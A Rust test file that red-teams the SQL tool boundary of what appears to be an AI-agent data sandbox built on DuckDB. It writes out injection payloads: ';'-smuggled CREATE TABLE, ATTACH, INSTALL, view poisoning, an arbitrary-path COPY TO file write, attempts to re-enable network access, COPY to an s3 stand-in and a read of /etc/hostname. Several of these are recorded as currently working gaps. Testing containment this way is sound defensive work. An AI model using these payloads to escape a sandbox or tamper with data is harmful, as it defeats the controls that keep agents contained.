// crates/droplet-core/src/security/writes_ddl.rs
//! Writes / DDL / statement-shape escapes — adversarial angles. seam: the `CREATE VIEW … AS (<sql>)` wrapper in `query`; COPY/INSTALL/ATTACH/PRAGMA/SET/multi-statement.
#![allow(unused_imports)]
use super::{catch_dispatch, dispatch, list_len, sales_parquet, tmp_dir, write_parquet};
use crate::DropletError;
use crate::engine_duckdb::{DEFAULT_MAX_RESULT_ROWS, Dataset, DuckEngine};
use crate::registry::Registry;
use crate::session::Session;
use crate::tool::{Tool, ToolCx};
use monty::MontyObject;

#[cfg(test)]
mod tests {
    use super::*;

    /// `CANARY` — FINDING: ';'-smuggled CREATE TABLE via local_sql executes and persists in the session engine (engine-state/namespace mutation). Original PROBE intent: this should be rejected. Converted from PROBE to CANARY asserting OBSERVED behavior.
    /// // FINDING: r.is_ok() (returns Int handle) and a follow-up SELECT * FROM evil succeeds (evil persists). The execute_batch seam in new_view runs ALL statements, not just the first. Fix target: engine_duckdb.rs new_view — enforce single-statement.
    /// seam: tools.rs local_sql tool -> engine_duckdb.rs local_sql -> new_view execute_batch; the 2nd statement CREATE TABLE persists in the session engine. local_sql with empty datasets splices sql verbatim into CREATE VIEW ds_n AS <sql>.
    #[test]
    fn known_gap_multistatement_create_table_executes_write() {
        let mut s = Session::new("wddl-ctas").unwrap();
        let r = s.run_code("local_sql('SELECT 1 AS x; CREATE TABLE evil AS SELECT 1', [])");
        let evil_exists = s.run_code("local_sql('SELECT * FROM evil', [])").is_ok();
        // FINDING: ';' breakout IS real — CREATE TABLE executes and persists. Assert observed (bad) behavior so a regression is caught when this is fixed.
        assert!(
            r.is_ok(),
            "CANARY: currently r.is_ok() (smuggled CREATE TABLE executes) — flip to is_err() when fixed"
        );
        assert!(
            evil_exists,
            "CANARY: evil table currently persists in session engine — assert false when fixed"
        );
    }

    /// `CANARY` — FINDING: ';'-smuggled ATTACH via query() executes and widens the connection's reachable catalog. Original PROBE intent: this should be rejected. Converted from PROBE to CANARY asserting OBSERVED behavior.
    /// // FINDING: ATTACH ':memory:' AS evildb succeeds (Ok). ATTACH of a real .db file path is also a route to read/write arbitrary DB files. Fix target: engine_duckdb.rs new_view — enforce single-statement.
    /// seam: engine_duckdb.rs new_view execute_batch; 2nd statement ATTACH adds a database to the connection catalog.
    #[test]
    fn known_gap_multistatement_attach_database_succeeds() {
        let dir = tmp_dir("wddl-attach");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-attach").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data; ATTACH ':memory:' AS evildb"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        // FINDING: ';' breakout IS real — ATTACH executes and widens catalog. Assert observed (bad) behavior.
        assert!(
            r.is_ok(),
            "CANARY: currently r.is_ok() (smuggled ATTACH executes) — flip to is_err() when fixed"
        );
    }

    /// `CANARY` — FINDING: ';'-smuggled INSTALL via query() executes (statement-shape containment bypassed). Egress remains blocked by disabled_filesystems latch (separate defense). Original PROBE intent: this should be rejected. Converted from PROBE to CANARY asserting OBSERVED behavior.
    /// // FINDING: INSTALL httpfs executes Ok (statement-shape bypass confirmed). The disabled_filesystems latch is the real backstop, not the wrapper. Fix target: engine_duckdb.rs new_view — enforce single-statement.
    /// seam: engine_duckdb.rs new_view execute_batch; 2nd statement INSTALL bypasses the single-SELECT view-body assumption (statement-shape containment), even though egress stays blocked by a separate latch.
    #[test]
    fn known_gap_multistatement_install_extension_runs() {
        let dir = tmp_dir("wddl-install");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-install").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data; INSTALL httpfs"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        // FINDING: ';' breakout IS real — INSTALL executes (statement-shape bypass). Egress still blocked by separate latch. Assert observed (bad) behavior.
        assert!(
            r.is_ok(),
            "CANARY: currently r.is_ok() (smuggled INSTALL executes) — flip to is_err() when fixed"
        );
    }

    /// `HOLDS` — Pins WHY this specific re-enable-network attempt is contained — a different defense layer (running-db latch) than the wrapper — so a regression removing the latch is caught even though the wrapper is already known-bypassable.
    /// seam: engine_duckdb.rs new_view execute_batch reaches the engine with a 2nd SET statement; DuckDB's running-db latch — NOT the wrapper — rejects enable_external_access.
    #[test]
    fn multistatement_set_extaccess_blocked_by_runtime_latch() {
        let dir = tmp_dir("wddl-setext");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-setext").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data; SET enable_external_access=true"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "SET enable_external_access=true must fail (DuckDB rejects it on a running db)"
        ); // VERIFIED this session: Err 'Invalid Input Error: Cannot enable external access while database is running'. This HOLDS by a DuckDB runtime latch, not by the CREATE VIEW wrapper; the ';' breakout DID reach the engine and was rejected there.
    }

    /// `HOLDS` — Distinct gadget: directly target the disabled_filesystems latch (the actual egress guard) rather than enable_external_access; confirms the one-way latch is the real backstop behind the bypassable wrapper.
    /// seam: engine_duckdb.rs new_view execute_batch reaches the engine with `SET disabled_filesystems=''`; DuckDB's one-way disabled-filesystem latch rejects un-disabling on a running db.
    #[test]
    fn multistatement_set_disabled_filesystems_empty_blocked() {
        let dir = tmp_dir("wddl-cleardfs");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-cleardfs").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data; SET disabled_filesystems=''"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "clearing disabled_filesystems must fail — DuckDB rejects un-disabling a filesystem on a running db (one-way latch)"
        ); // VERIFIED this session: Err 'Invalid Input Error: File system \"S3FileSystem\" has been disabled previously, it cannot be re-enabled'. The ';' breakout reaches the engine but the one-way latch keeps network FS off.
    }

    /// `HOLDS` — Classic SQLi paren-balance breakout — distinct from the ';' multi-statement angle because here statement #1 itself is corrupted by the unbalanced ')', so the WHOLE batch fails to parse and nothing (not even stmt #1) runs.
    /// seam: engine_duckdb.rs local_sql wraps as `WITH data AS (SELECT * FROM ds_0) <sql>` then `CREATE VIEW ds_n AS <that>`; agent injects ')' to try to close the wrapper and append a write.
    #[test]
    fn paren_injection_close_view_then_copy_is_parser_rejected() {
        let dir = tmp_dir("wddl-paren");
        let p = sales_parquet(&dir);
        let leak = dir.join("paren_leak.csv");
        let mut s = Session::new("wddl-paren").unwrap();
        let sql = format!(
            "SELECT * FROM data) ; COPY (SELECT 1) TO '{}' --",
            leak.to_str().unwrap()
        );
        let r = s.run_code(&format!("query({p:?}, {sql:?})"));
        let wrote = leak.exists();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "a stray ')' to break out of the wrapper must be a parser error"
        );
        assert!(!wrote, "paren-injection COPY must not write a file"); // VERIFIED this session: 'Parser Error: syntax error at or near \")\"' on `... WITH data AS (...) SELECT * FROM data) ; COPY ...`; no file written.
    }

    /// `CANARY` — FINDING: block-comment obfuscation + ';' still smuggles a 2nd statement (CREATE TABLE executes). Comments are irrelevant; the ';' is the seam. Original PROBE intent: this should be rejected. Converted from PROBE to CANARY asserting OBSERVED behavior.
    /// // FINDING: '/* hide */ ; CREATE TABLE evil2 AS SELECT 1' executes the CREATE TABLE. Comment obfuscation provides no additional bypass mechanism — the ';' alone is the gap. Fix target: engine_duckdb.rs new_view — enforce single-statement.
    /// seam: engine_duckdb.rs new_view execute_batch; a block comment before ';' does not change the statement boundary — the ';' still starts a real 2nd statement (CREATE TABLE).
    #[test]
    fn known_gap_comment_then_semicolon_smuggles_second_statement() {
        let dir = tmp_dir("wddl-comment");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-comment").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data /* hide */ ; CREATE TABLE evil2 AS SELECT 1"
        ));
        let leaked = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT count(*) AS c FROM evil2"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        // FINDING: comment + ';' breakout IS real — CREATE TABLE executes. Assert observed (bad) behavior.
        assert!(
            r.is_ok(),
            "CANARY: currently r.is_ok() (smuggled CREATE TABLE via comment+; executes) — flip to is_err() when fixed"
        );
        assert!(
            leaked.is_ok(),
            "CANARY: evil2 table currently exists and is queryable — assert is_err() when fixed"
        );
    }

    /// `HOLDS` — Single-statement COPY-TO-s3 — the canonical exfil-write; confirms the view-body shape guard rejects it when NOT smuggled behind a ';'. Distinct from the multistatement COPY angle (no ';').
    /// seam: query() -> local_sql -> `CREATE VIEW ds_n AS WITH data AS (...) <COPY...>`; COPY is not a SELECT so it cannot be a view body.
    #[test]
    fn single_copy_to_s3_as_view_body_is_parser_rejected() {
        let dir = tmp_dir("wddl-copys3");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-copys3").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "COPY data TO 's3://nope/out.parquet'"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "a bare COPY TO as the agent SQL must be a parser error (COPY is not a valid CREATE VIEW body)"
        ); // VERIFIED this session: bare COPY TO -> Err. (Even if it parsed, S3 FS is disabled.)
    }

    /// `HOLDS` — Extension-loading via a single (un-smuggled) statement — homogeneous mini-family of 3 distinct extension verbs proving the view-body guard rejects each. Complements the ';'-smuggled INSTALL PROBE.
    /// seam: query() -> `CREATE VIEW ds_n AS WITH data AS (...) <INSTALL|LOAD>`; non-SELECT body.
    #[test]
    fn single_install_load_as_view_body_is_parser_rejected() {
        let dir = tmp_dir("wddl-installbare");
        let p = sales_parquet(&dir);
        let cases = ["INSTALL httpfs", "LOAD httpfs", "INSTALL spatial"];
        let mut errs = true;
        for c in cases {
            let mut s = Session::new("wddl-installbare").unwrap();
            errs &= s.run_code(&format!("query({p:?}, {c:?})")).is_err();
        }
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            errs,
            "bare INSTALL/LOAD as the agent SQL must each be a parser error"
        ); // VERIFIED this session: INSTALL httpfs / LOAD httpfs each -> Err as a view body. (INSTALL spatial follows the same non-SELECT shape.)
    }

    /// `HOLDS` — Homogeneous family of single non-SELECT statement-shapes; each a distinct DML/DDL verb the wrapper rejects as a view body. Proves the BARE forms are contained, complementing the multistatement breakouts.
    /// seam: query() -> `CREATE VIEW ds_n AS WITH data AS (...) <PRAGMA|SET|ATTACH|EXPORT|INSERT|DELETE|UPDATE|CALL>`; non-SELECT statement bodies.
    #[test]
    fn single_pragma_set_attach_export_dml_as_view_body_rejected() {
        let dir = tmp_dir("wddl-stmts");
        let p = sales_parquet(&dir);
        let cases = [
            "PRAGMA database_list",
            "SET enable_external_access=true",
            "ATTACH 'x.db' AS y",
            "EXPORT DATABASE '/tmp/exp'",
            "INSERT INTO data VALUES (1)",
            "DELETE FROM data",
            "UPDATE data SET amt=2",
            "CALL pragma_version()",
        ];
        let mut all_err = true;
        for c in cases {
            let mut s = Session::new("wddl-stmts").unwrap();
            all_err &= s.run_code(&format!("query({p:?}, {c:?})")).is_err();
        }
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            all_err,
            "every non-SELECT statement (PRAGMA/SET/ATTACH/EXPORT DATABASE/INSERT/DELETE/UPDATE/CALL) must be a parser error as a view body"
        ); // VERIFIED this session: each of the 8 bare statements -> Err when run as a query() view body.
    }

    /// `HOLDS` — CTE-prefix collision: a structurally different breakout attempt — abusing the host-prepended WITH to chain a second WITH to redefine `data` or smuggle structure — distinct from ';' and ')' injection.
    /// seam: engine_duckdb.rs local_sql prepends `WITH data AS (...)`; agent SQL that itself starts with WITH yields an illegal `WITH data AS(...) WITH t AS(...)`.
    #[test]
    fn agent_leading_with_clause_double_with_is_rejected() {
        let dir = tmp_dir("wddl-doublewith");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-doublewith").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "WITH t AS (SELECT 1) SELECT * FROM t"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "agent SQL beginning with its own WITH must error (the prepended 'WITH data AS(...)' makes a double-WITH that DuckDB rejects)"
        ); // VERIFIED this session: 'CREATE VIEW ds_n AS WITH data AS (...) WITH t AS (...) ...' -> 'Parser Error: syntax error at or near \"WITH\"'.
    }

    /// `HOLDS` — Handle-poisoning gadget: redefine an existing ds_n view another handle points at (cross-handle data-integrity confusion). Tests the ')'-balanced form, which is rejected.
    /// seam: engine_duckdb.rs new_view `CREATE VIEW ds_n AS <sql>`; agent tries ')' + CREATE OR REPLACE VIEW ds_0 to poison an existing handle's view.
    #[test]
    fn create_or_replace_view_paren_injection_is_parser_rejected() {
        let dir = tmp_dir("wddl-corv");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-corv").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "SELECT * FROM data); CREATE OR REPLACE VIEW ds_0 AS SELECT 9; --(SELECT 1"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "CREATE OR REPLACE VIEW handle-poison injection (')'-form) must be parser-rejected"
        ); // VERIFIED this session: the leading ')' is unbalanced -> 'Parser Error: syntax error at or near \")\"'.
    }

    /// `CANARY` — FINDING: ';'-smuggled CREATE OR REPLACE VIEW via local_sql silently poisons an existing handle's view (handle-content integrity violation). Original PROBE intent: this should be rejected. Converted from PROBE to CANARY asserting OBSERVED behavior.
    /// // FINDING: CREATE OR REPLACE VIEW ds_0 succeeds and mutates the view the earlier `ds` handle resolves to — to_rows(ds) subsequently returns the attacker's injected rows. This is a distinct consequence-class: not disk write/CTAS/ATTACH, but SILENT DATA INTEGRITY CORRUPTION of an opaque handle. Fix target: engine_duckdb.rs new_view — enforce single-statement.
    /// seam: engine_duckdb.rs new_view execute_batch; a ';'-smuggled CREATE OR REPLACE VIEW ds_0 rewrites the view an EARLIER handle resolves to (handle-content poisoning / data integrity).
    #[test]
    fn known_gap_create_or_replace_view_semicolon_poisons_existing_handle() {
        let dir = tmp_dir("wd-poison");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wd-poison").unwrap();
        s.run_code(&format!("ds = register({p:?})")).unwrap(); // ds -> handle 0 -> view ds_0
        let before = s.run_code("to_rows(ds)").unwrap(); // baseline (region 'EU', amt 1.0)
        // ;-smuggle a CREATE OR REPLACE VIEW ds_0 (deterministic engine view name) with attacker rows:
        let evil = "local_sql('SELECT 1 AS x; CREATE OR REPLACE VIEW ds_0 AS SELECT 99 AS region, CAST(1234.0 AS DOUBLE) AS amt', [])";
        let r = s.run_code(evil);
        // FINDING: ';' breakout IS real — handle-content poisoning confirmed. Assert observed (bad) behavior.
        assert!(
            r.is_ok(),
            "CANARY: currently r.is_ok() (smuggled CREATE OR REPLACE VIEW executes, poisoning handle) — flip to is_err() when fixed; got {r:?}"
        );
        let after = s.run_code("to_rows(ds)").unwrap(); // SAME handle, now poisoned
        let before_s = format!("{before:?}");
        let after_s = format!("{after:?}");
        assert_ne!(
            before_s, after_s,
            "KNOWN GAP: the handle's data changed silently"
        );
        assert!(
            after_s.contains("99") && after_s.contains("1234"),
            "KNOWN GAP: handle now returns ATTACKER rows: {after_s}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `CANARY` — FINDING (HIGH, new): the query() CREATE VIEW wrapper does NOT block a ;-smuggled COPY TO,
    /// so an agent can WRITE attacker content to an arbitrary host path (engine_duckdb.rs::new_view uses
    /// execute_batch, running every ;-delimited statement). Local-only (no network egress). Flip to assert
    /// the write is BLOCKED when new_view enforces single-statement execution.
    #[test]
    fn known_gap_multistatement_copy_to_writes_arbitrary_local_file() {
        let dir = tmp_dir("wd-copywrite");
        let p = sales_parquet(&dir);
        // Target OUTSIDE the session work_dir, proving arbitrary-path write:
        let target = dir.join("exfil_PWNED.csv");
        let target_s = target.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&target);
        let mut s = Session::new("wd-copywrite").unwrap();
        let code = format!(
            "query({p:?}, \"SELECT * FROM data; COPY (SELECT 'PWNED' AS marker) TO '{target_s}' (FORMAT CSV)\")"
        );
        let r = s.run_code(&code);
        assert!(
            r.is_ok(),
            "KNOWN GAP: ;-smuggled COPY TO executes via execute_batch; got {r:?}"
        );
        assert!(
            target.exists(),
            "KNOWN GAP: arbitrary local-file WRITE — the COPY created a host file"
        );
        let contents = std::fs::read_to_string(&target).unwrap_or_default();
        assert!(
            contents.contains("PWNED"),
            "the written file holds attacker content: {contents:?}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `HOLDS` — Boundary/anti-regression canary for the eventual single-statement fix: ensures the remediation distinguishes an empty trailing statement (benign) from a smuggled one (malicious). Distinct purpose from every breakout test.
    /// seam: engine_duckdb.rs new_view execute_batch; a harmless trailing ';' (empty 2nd statement) must NOT be conflated with a real 2nd statement when the single-statement fix lands.
    #[test]
    fn trailing_semicolon_only_is_benign_not_a_breakout() {
        let dir = tmp_dir("wddl-trailsemi");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-trailsemi").unwrap();
        let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data;"));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "a single SELECT with a harmless trailing ';' should still succeed"
        ); // VERIFIED currently Ok this session. Documents the desired behavior of the future single-statement guard: it must allow a lone trailing ';' (empty 2nd statement) while rejecting a NON-empty 2nd statement. Guards the fix against over-rejecting legitimate SQL.
    }

    /// `HOLDS` — COPY FROM (the read/ingest direction of COPY, distinct from COPY TO) — confirms BOTH directions of COPY are rejected as bare view bodies; would only break out via the ';' seam.
    /// seam: query() CREATE VIEW body; `COPY ... FROM` ingests a host file into a table (write/ingest side of COPY) — non-SELECT body.
    #[test]
    fn copy_from_local_file_as_view_body_rejected() {
        let dir = tmp_dir("wddl-copyfrom");
        let p = sales_parquet(&dir);
        let mut s = Session::new("wddl-copyfrom").unwrap();
        let r = s.run_code(&format!(
            "query({p:?}, {:?})",
            "COPY data FROM '/etc/hostname'"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "COPY ... FROM as the agent SQL must be a parser error (non-SELECT view body)"
        ); // VERIFIED this session: bare COPY data FROM ... -> Err as a view body.
    }
}
